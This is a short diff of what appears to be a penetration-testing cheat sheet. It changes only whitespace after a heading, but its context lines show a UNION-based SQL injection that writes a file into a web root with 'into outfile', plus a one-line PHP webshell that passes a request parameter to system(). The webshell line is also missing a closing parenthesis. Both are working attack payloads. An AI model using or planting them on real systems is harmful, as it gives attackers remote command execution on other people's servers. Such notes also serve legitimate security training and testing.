@@ -265,7 +265,7 @@ cn' union select 1, 'file written successfully!', 3, 4 into outfile '/var/www/ht
 # Note: with the above injection, your file will look like "1 file written successfuly 3 4"
 # Note: This is because the entire select is written to the file, to clean it up, use "" in place of the numbers
 ```
-**Example Webshell**
+**Example Webshell**  
 Example PHP webshell
 ```php
 <?php system($_REQUEST[0]; ?>
